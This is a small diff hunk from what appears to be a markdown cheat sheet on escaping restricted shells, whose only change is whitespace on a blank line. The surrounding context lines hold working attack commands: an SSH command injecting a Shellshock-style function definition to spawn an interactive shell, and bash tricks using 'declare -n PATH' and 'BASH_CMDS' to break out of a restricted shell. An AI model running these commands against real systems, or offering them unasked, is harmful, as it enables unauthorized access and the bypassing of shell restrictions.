@@ -111,7 +111,7 @@ ssh user@<IP> -t "() { :; }; sh -i "
 
 ```bash
 declare -n PATH; export PATH=/bin;bash -i
- 
+
 BASH_CMDS[shell]=/bin/bash;shell -i
 ```
 
